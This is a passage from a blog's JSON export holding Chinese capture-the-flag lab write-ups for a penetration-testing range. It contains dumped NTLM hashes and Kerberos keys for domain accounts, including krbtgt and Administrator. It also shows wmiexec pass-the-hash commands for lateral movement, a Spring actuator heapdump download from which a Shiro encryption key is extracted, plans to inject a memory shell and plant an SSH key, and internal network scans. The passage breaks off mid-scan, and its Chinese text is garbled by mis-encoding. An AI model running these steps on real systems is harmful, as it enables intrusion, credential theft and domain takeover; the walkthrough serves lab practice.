f0cc8fa9ded68237e1861cfa3f28d483:::PC1$: 1103: aad3b435b51404eeaad3b435b51404ee: 5fbf6f7f779da62fe4db9d8448cebed5:::FILESERVER$: 1114: aad3b435b51404eeaad3b435b51404ee: 951d8a9265dfb652f42e5c8c497d70dc:::test1$: 1116: aad3b435b51404eeaad3b435b51404ee: 32ed87bdb5fdc5e9cba88547376818d4:::lv$: 1117: aad3b435b51404eeaad3b435b51404ee: 32ed87bdb5fdc5e9cba88547376818d4:::evailpc$: 1118: aad3b435b51404eeaad3b435b51404ee: 8846f7eaee8fb117ad06bdd830b7586c:::ll$: 1119: aad3b435b51404eeaad3b435b51404ee: 32ed87bdb5fdc5e9cba88547376818d4:::TEST2$: 1120: aad3b435b51404eeaad3b435b51404ee: e19ccf75ee54e06b06a5907af13cef42:::[*] Kerberos keys grabbedAdministrator: aes256-cts-hmac-sha1-96:4502e83276d2275a8f22a0be848aee62471ba26d29e0a01e2e09ddda4ceea683Administrator: aes128-cts-hmac-sha1-96:38496df9a109710192750f2fbdbe45b9Administrator: des-cbc-md5: f72a9889a18cc408krbtgt: aes256-cts-hmac-sha1-96:01cbdd6e9fcb7381f08f6ff1c3698f5642e1fd7b2a0dee8c85b9ad370a09abddkrbtgt: aes128-cts-hmac-sha1-96: edde21e07fc8dc56b0d5c7f1cec73691krbtgt: des-cbc-md5:8adace38ba738a34chenfang: aes256-cts-hmac-sha1-96:2c06b19f9f574ee1e7db61071aece803de7af58d229b3529e04d9ec38aac5941chenfang: aes128-cts-hmac-sha1-96:4014efeb6533ba5a572fc41826573c46chenfang: des-cbc-md5: f2ba8f496e702664zhanghao: aes256-cts-hmac-sha1-96: ea51257d0834bdeabc87c48fede2ede9b9833d6d87dcc1ed26747a5990dbb301zhanghao: aes128-cts-hmac-sha1-96:5efc32f73f2cff27f49b80346d0ab172zhanghao: des-cbc-md5: ef19c776ef4caef7wangyun: aes256-cts-hmac-sha1-96:5aac300487414042e25eb1fffe5681392a8c0013c27413c6982b19445032db9awangyun: aes128-cts-hmac-sha1-96:8a2c325e83084282896dcdc40d5780fewangyun: des-cbc-md5: c434a716fe7ad3dczhangwei: aes256-cts-hmac-sha1-96:8ccb33735cb1be69c9e115ecde51ce41d33ee297446d4603ec43f6367ed9c77bzhangwei: aes128-cts-hmac-sha1-96:1fdbe52915e9ccb03b813a2f0215b0c1zhangwei: des-cbc-md5:7998f12a86024a07wangkai: aes256-cts-hmac-sha1-96:76eb8643be14b795327e149899984c077a0db78b4af7faaf45759ef87e44e6a8wangkai: aes128-cts-hmac-sha1-96:4ce9f8c194b606feca44d2c84a8b3215wangkai: des-cbc-md5: e9ec9bb95b514902yangyan: aes256-cts-hmac-sha1-96: e5c045bcb69ef53b66405645764f811b55909c2f67e3b9c5c816e584711206bayangyan: aes128-cts-hmac-sha1-96: b5b5780c2b9014223fff940e2d0ddb99yangyan: des-cbc-md5: f2ae7ccb756d2c20zhangxin: aes256-cts-hmac-sha1-96:06f75e8f90bff7ef536d682da9ce719c235d54d4660936aaf71499859960e8b3zhangxin: aes128-cts-hmac-sha1-96: fdb55e032fd0647f4519e225544b3de6zhangxin: des-cbc-md5: df67d6b59d106710wangping: aes256-cts-hmac-sha1-96: d0c1d5bf581d866b7a57c4b75d8dccf2d996d0f91226cd13dae1ebad02c220e0wangping: aes128-cts-hmac-sha1-96: db24cb50818548f0d70ff12b7e94e5bfwangping: des-cbc-md5: e31c10866b6e1af1DC$: aes256-cts-hmac-sha1-96:2177cba61e6bef5c2358728bbd38fcf555a385ca2bc21a7bee0eb7082bc43009DC$: aes128-cts-hmac-sha1-96:2a93500066caecc8ca1fd443dfe71045DC$: des-cbc-md5: d99d163738d0514aPC1$: aes256-cts-hmac-sha1-96:6f9ab6bbf92b25ffc47a2e2e4d02611810153ed1f638ad0661a1c2ba6a44c35bPC1$: aes128-cts-hmac-sha1-96: a332459ac3ed4676081045169db6642fPC1$: des-cbc-md5: c1bf253e7abcfe3eFILESERVER$: aes256-cts-hmac-sha1-96:3c57a20b8c4506d147055c344c6a1b029ad98df9885950b4962a5da1d737bf81FILESERVER$: aes128-cts-hmac-sha1-96: e199679dc0624225beb20d195bcebf89FILESERVER$: des-cbc-md5: cb98a7ce7043a7batest1$: aes256-cts-hmac-sha1-96:12d38e3177a4f263be6da2f3ec99357341205fc563c165866aee4a6d46f55801test1$: aes128-cts-hmac-sha1-96:87646137635d8377a3558ed890818c8etest1$: des-cbc-md5: b561234070166d9blv$: aes256-cts-hmac-sha1-96: b5e3de41bfde0550d7c122c2521ccdf1f071679d01823c8e7a3102bd060ae9eflv$: aes128-cts-hmac-sha1-96: bd32120973f173a6aea2d174072dffb1lv$: des-cbc-md5:38e397adbc027f4cevailpc$: aes256-cts-hmac-sha1-96:9d216633c05f405b584a68b418250a99c47de5afaa8261cbaa85e71c1a450b38evailpc$: aes128-cts-hmac-sha1-96:7d88d455f095e199cc2a9b97ce72b38cevailpc$: des-cbc-md5:8664376ea2cb5280ll$: aes256-cts-hmac-sha1-96:2ee5b4caa01084d7cefb60fce5daa2bb35e2c06bdb4b56516b0d5f1f926819dfll$: aes128-cts-hmac-sha1-96:5db4f55cb677946d95a74a19df68ab44ll$: des-cbc-md5: d37615076e451ca8TEST2$: aes256-cts-hmac-sha1-96:6fad46be8d54b5431df61db10866c987d2c64ff528419ec0ee7f7a38d6e7ee6fTEST2$: aes128-cts-hmac-sha1-96:476a93fc85b66f3861e3b51e39f3b8d0TEST2$: des-cbc-md5:640780a13ee357c7[*] Cleaning up... æ‹¿åˆ°åŸŸæ§ä¹‹åå°±æ¨ªå‘å°±å¯ä»¥äº† 1234567wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee: c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/Administrator@172.22.60.15Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] SMBv3.0 dialect used[!] Launching semi-interactive shell - Careful what you execute[!] Press help for extra shell commandsC:\\&gt; 12345678â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee: c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/Administrator@172.22.60.8Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] SMBv3.0 dialect used[!] Launching semi-interactive shell - Careful what you execute[!] Press help for extra shell commandsC:\\&gt;","categories":[{"name":"æ˜¥ç§‹äº‘é•œ","slug":"æ˜¥ç§‹äº‘é•œ","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"æ˜¥ç§‹äº‘é•œ-ThermalPower","slug":"æ˜¥ç§‹äº‘é•œ-ThermalPower","date":"2025-05-02T03:09:18.000Z","updated":"2025-05-02T14:00:33.448Z","comments":true,"path":"2025/05/02/æ˜¥ç§‹äº‘é•œ-ThermalPower/","permalink":"https://lvzhouhang.xyz/2025/05/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-ThermalPower/","excerpt":"","text":"FLAG0112345678910111213141516171819202122232425262728293031323334353637â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# ../../pentest/fscan/fscan2 -h 39.98.122.145â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚â”‚ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-05-01 23:10:46] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-05-01 23:10:46] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-05-01 23:10:46] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1[2025-05-01 23:10:46] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-05-01 23:10:46] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-05-01 23:10:46] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.122.145:22[2025-05-01 23:10:47] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.122.145:22 =&gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.9 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.][2025-05-01 23:10:49] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.122.145:8080[2025-05-01 23:10:54] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.122.145:8080 =&gt; [http][2025-05-01 23:10:56] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 2[2025-05-01 23:10:56] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-05-01 23:10:56] [INFO] åŠ è½½çš„æ’ä»¶: ssh, webpoc, webtitle[2025-05-01 23:10:56] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.98.122.145:8080 çŠ¶æ€ç :302 é•¿åº¦:0 æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http://39.98.122.145:8080/login;jsessionid=C10B39BA0BC886E7924F52A8BA23B5B6[2025-05-01 23:10:57] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.98.122.145:8080/login;jsessionid=C10B39BA0BC886E7924F52A8BA23B5B6 çŠ¶ æ€ç :200 é•¿åº¦:2936 æ ‡é¢˜:ç«åˆ›èƒ½æºç›‘æ§ç”»é¢ç®¡ç†å¹³å°[2025-05-01 23:11:00] [SUCCESS] ç›®æ ‡: http://39.98.122.145:8080 æ¼æ´ç±»å‹: poc-yaml-spring-actuator-heapdump-file æ¼æ´åç§°: è¯¦ç»†ä¿¡æ¯: author:AgeloVito links:https://www.cnblogs.com/wyb628/p/8567610.html[2025-05-01 23:11:00] [SUCCESS] ç›®æ ‡: http://39.98.122.145:8080 æ¼æ´ç±»å‹: poc-yaml-springboot-env-unauth æ¼æ´åç§°: spring2 è¯¦ç»†ä¿¡æ¯: links:https://github.com/LandGrey/SpringBootVulExploit[2025-05-01 23:11:03] [SUCCESS] æ‰«æå·²å®Œæˆ: 3/3 å¯ä»¥æ‰«æœ‰8080ç«¯å£æœ‰ä¸€ä¸ªpoc-yaml-spring-actuator-heapdump-fileï¼Œå…ˆå°†heapdumpæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ 1234567891011â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# wget http://39.98.122.145:8080/actuator/heapdump--2025-05-01 23:13:13-- http://39.98.122.145:8080/actuator/heapdumpConnecting to 39.98.122.145:8080... connected.HTTP request sent, awaiting response... 200Length: 31181349 (30M) [application/octet-stream]Saving to: â€˜heapdumpâ€™heapdump 100%[=================================================&gt;] 29.74M 1.36MB/s in 21s2025-05-01 23:13:35 (1.41 MB/s) - â€˜heapdumpâ€™ saved [31181349/31181349] ç„¶åç”¨å·¥å…·è¿›è¡Œåˆ†æ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump===========================================SpringDataSourceProperties-------------not found!===========================================WeblogicDataSourceConnectionPoolConfig-------------not found!===========================================MongoClient-------------not found!===========================================AliDruidDataSourceWrapper-------------not found!===========================================HikariDataSource-------------not found!===========================================RedisStandaloneConfiguration-------------not found!===========================================JedisClient-------------not found!===========================================CookieRememberMeManager(ShiroKey)-------------algMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES===========================================OriginTrackedMapPropertySource-------------management.endpoints.web.exposure.include = *spring.thymeleaf.encoding = UTF-8management.endpoint.health.show-details = alwaysspring.thymeleaf.cache = truespring.thymeleaf.content-type = text/htmlserver.port = 8080spring.thymeleaf.check-template = truemanagement.endpoints.jmx.exposure.include = *===========================================MutablePropertySources-------------awt.toolkit = sun.awt.X11.XToolkitsun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classesjava.protocol.handler.pkgs = org.springframework.boot.loadersun.management.compiler = HotSpot 64-Bit Tiered Compilerssun.cpu.isalist =sun.jnu.encoding = UTF-8java.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08java.class.path = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jarpath.separator = :java.vm.vendor = Private Buildos.version = 5.4.0-166-genericjava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsedjava.runtime.name = OpenJDK Runtime Environmentfile.encoding = UTF-8catalina.useNaming = falsespring.beaninfo.ignore = truejava.vm.specification.version = 1.8os.name = Linuxjava.vm.name = OpenJDK 64-Bit Server VMlocal.server.port = nulluser.country = USjava.vendor.url.bug = http://bugreport.sun.com/bugreport/sun.java.command = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jarjava.io.tmpdir = /tmpcatalina.home = /tmp/tomcat.8080.2227855515484347988java.version = 1.8.0_392user.home = /rootuser.language = enPID = 620java.awt.printerjob = sun.print.PSPrinterJobCONSOLE_LOG_CHARSET = UTF-8file.separator = /catalina.base = /tmp/tomcat.8080.2227855515484347988java.vm.info = mixed modejava.specification.name = Java Platform API Specificationjava.vm.specification.vendor = Oracle CorporationFILE_LOG_CHARSET = UTF-8java.awt.graphicsenv = sun.awt.X11GraphicsEnvironmentjava.awt.headless = truesun.io.unicode.encoding = UnicodeLittlejava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext===========================================MapPropertySources-------------local.server.port = null===========================================ConsulPropertySources-------------not found!===========================================JavaProperties-------------java.util.logging.FileHandler.pattern = %h/java%u.logawt.toolkit = sun.awt.X11.XToolkitsun.cpu.isalist =sun.jnu.encoding = UTF-8java.class.path = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jarjdk.security.legacyAlgorithms = SHA1, RSA keySize &lt; 2048, DSA keySize &lt; 2048java.vm.vendor = Private Buildjdk.disabled.namedCurves = secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1crypto.policy = unlimitedjceks.key.serialFilter = java.lang.Enum;java.security.KeyRep;java.security.KeyRep$Type;javax.crypto.spec.SecretKeySpec;!*sun.arch.data.model = 64login.configuration.provider = sun.security.provider.ConfigFilecatalina.useNaming = falseuser.timezone =security.overridePropertiesFile = truejava.vm.specification.version = 1.8os.name = Linuxuser.country = USsecurity.provider.7 = com.sun.security.sasl.Providersun.boot.library.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64sun.java.command = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jarsecurity.provider.9 = sun.security.smartcardio.SunPCSCjdk.security.caDistrustPolicies = SYMANTEC_TLSsun.cpu.endian = littleuser.home = /rootuser.language = enjava.specification.vendor = Oracle Corporationen = UTF-8security.provider.1 = sun.security.provider.Sunsecurity.provider.2 = sun.security.rsa.SunRsaSignsecurity.provider.3 = sun.security.ec.SunECnetworkaddress.cache.negative.ttl = 10jdk.tls.alpnCharset = ISO_8859_1security.provider.4 = com.sun.net.ssl.internal.ssl.Providersecurity.provider.5 = com.sun.crypto.provider.SunJCEsecurity.provider.6 = sun.security.jgss.SunProviderssl.KeyManagerFactory.algorithm = SunX509file.separator = /java.specification.name = Java Platform API Specificationjava.vm.specification.vendor = Oracle CorporationFILE_LOG_CHARSET = UTF-8.level = INFOjava.awt.graphicsenv = sun.awt.X11GraphicsEnvironmentja = UTF-8java.awt.headless = truecom.xyz.foo.level = SEVEREpackage.definition = sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.sun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classesjava.protocol.handler.pkgs = org.springframework.boot.loadersun.management.compiler = HotSpot 64-Bit Tiered Compilersjava.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08policy.provider = sun.security.provider.PolicyFileuser.name = rootpolicy.url.1 = file:$&#123;java.home&#125;/lib/security/java.policypath.separator = :fr = UTF-8securerandom.source = file:/dev/randompolicy.url.2 = file:$&#123;user.home&#125;/.java.policyjdk.tls.disabledAlgorithms = SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize &lt; 1024, EC keySize &lt; 224, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurvesos.version = 5.4.0-166-genericjava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsedpolicy.ignoreIdentityScope = falsejava.runtime.name = OpenJDK Runtime Environmentkeystore.type.compat = truefile.encoding = UTF-8spring.beaninfo.ignore = truejava.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatterjava.vm.name = OpenJDK 64-Bit Server VMjdk.sasl.disabledMechanisms =java.vendor.url.bug = http://bugreport.sun.com/bugreport/java.io.tmpdir = /tmpjava.util.logging.FileHandler.formatter = java.util.logging.XMLFormatterjava.util.logging.FileHandler.count = 1catalina.home = /tmp/tomcat.8080.2227855515484347988java.version = 1.8.0_392sun.cds.enableSharedLookupCache = falsesun.security.krb5.maxReferrals = 5jdk.tls.keyLimits = AES/GCM/NoPadding KeyUpdate 2^37PID = 620java.vm.specification.name = Java Virtual Machine Specificationjava.awt.printerjob = sun.print.PSPrinterJobCONSOLE_LOG_CHARSET = UTF-8jdk.xml.dsig.secureValidationPolicy = disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoopscatalina.base = /tmp/tomcat.8080.2227855515484347988java.library.path = /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/libjava.util.logging.FileHandler.limit = 50000java.vm.info = mixed mode, sharingjava.vendor = Private Buildkeystore.type = jksjava.specification.maintenance.version = 5handlers = java.util.logging.ConsoleHandlersun.io.unicode.encoding = UnicodeLittlejava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/extpolicy.expandProperties = truesecurerandom.strongAlgorithms = NativePRNGBlocking:SUNkrb5.kdc.bad.policy = tryLast===========================================ProcessEnvironment-------------not found!===========================================OSS-------------not found!===========================================UserPassSearcher-------------org.apache.shiro.web.filter.authc.FormAuthenticationFilter:[failureKeyAttribute = shiroLoginFailure, loginUrl = /login, successUrl = /, usernameParam = username, passwordParam = password]org.apache.catalina.startup.Tomcat:[hostname = localhost]===========================================CookieThief-------------not found!===========================================AuthThief-------------not found!=========================================== æœ‰ç”¨çš„æ˜¯è¿™é‡Œï¼Œå­˜åœ¨ä¸€ä¸ªshirokeyï¼Œç„¶åshiroä¸€æŠŠæ¢­ï¼Œæ³¨å…¥å†…å­˜é©¬ 1234===========================================CookieRememberMeManager(ShiroKey)-------------algMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES flag01åœ¨æ ¹ç›®å½• FLAG02å†™ä¸€ä¸ªå…¬é’¥è¿›å»ï¼Œsshè¿æ¥ï¼Œä¸Šä¼ ä¸€ä¸ªfscanå†åšä¸€ä¸ªä»£ç† fscanæ‰«ä¸€ä¸‹å†…ç½‘ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273root@security:~# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:2f:44:6e brd ff:ff:ff:ff:ff:ff inet 172.22.17.213/16 brd 172.22.255.255 scope global dynamic eth0 valid_lft 315359102sec preferred_lft 315359102sec inet6 fe80::216:3eff:fe2f:446e/64 scope link valid_lft forever preferred_lft foreverroot@security:~# ./fscan2 -h 172.22.17.213/24â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚â”‚ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-05-02 11:23:19] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-05-02 11:23:19] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-05-02 11:23:19] [INFO] CIDRèŒƒå›´: 172.22.17.0-172.22.17.255[2025-05-02 11:23:20] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.17.0.%!d(string=172.22.17.255) - %!s(MISSING).%!d(MISSING)[2025-05-02 11:23:20] [INFO] è§£æCIDR 172.22.17.213/24 -&gt; IPèŒƒå›´ 172.22.17.0-172.22.17.255[2025-05-02 11:23:20] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256[2025-05-02 11:23:20] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-05-02 11:23:20] [SUCCESS] ç›®æ ‡ 172.22.17.6 å­˜æ´» (ICMP)[2025-05-02 11:23:20] [SUCCESS] ç›®æ ‡ 172.22.17.213 å­˜æ´» (ICMP)[2025-05-02 11:23:23] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 2[2025-05-02 11:23:23] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:445[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:139[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:135[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:21[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:80[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.213:22[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.213:8080[2025-05-02 11:23:23] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.17.6:21 =&gt; [ftp] äº§å“:Microsoft ftpd ç³»ç»Ÿ:Windows Banner:[220 Microsoft FTP Service.][2025-05-02 11:23:23] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.17.213:22 =&gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.9 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.][2025-05-02 11:23:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.17.6:445 =&gt;[2025-05-02 11:23:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.17.6:139 =&gt; Banner:[.][2025-05-02 11:23:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.17.213:8080 =&gt; [http][2025-05-02 11:23:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.17.6:80 =&gt; [http][2025-05-02 11:24:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.17.6:135 =&gt;[2025-05-02 11:24:28] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 7[2025-05-02 11:24:28] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-05-02 11:24:28] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ftp, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-05-02 11:24:28] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.17.6 çŠ¶æ€ç :200 é•¿åº¦:661 æ ‡é¢˜:172.22.17.6 - /[2025-05-02 11:24:28] [SUCCESS] NetBios 172.22.17.6 WORKGROUP\\WIN-ENGINEER[2025-05-02 11:24:28] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.17.6ä¸»æœºå: WIN-ENGINEERå‘ç°çš„ç½‘ç»œæ¥å£: IPv4åœ°å€: â””â”€ 172.22.17.6[2025-05-02 11:24:28] [SUCCESS] ç½‘ç«™æ 